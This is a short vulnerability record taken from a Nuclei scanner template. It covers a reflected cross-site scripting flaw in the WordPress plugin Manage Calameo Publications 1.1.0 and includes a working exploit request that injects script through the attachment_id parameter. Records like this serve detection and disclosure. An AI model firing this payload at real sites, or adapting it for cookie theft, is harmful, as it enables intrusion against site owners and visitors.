# Vulnerability: WordPress Manage Calameo Publications 1.1.0 - Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`calameo-publications-xss.yaml`)

## Description
WordPress Manage Calameo Publications 1.1.0 is vulnerable to reflected cross-site scripting via  thickbox_content.php and the attachment_id parameter.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/athlon-manage-calameo-publications/thickbox_content.php?attachment_id=id%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%26
```

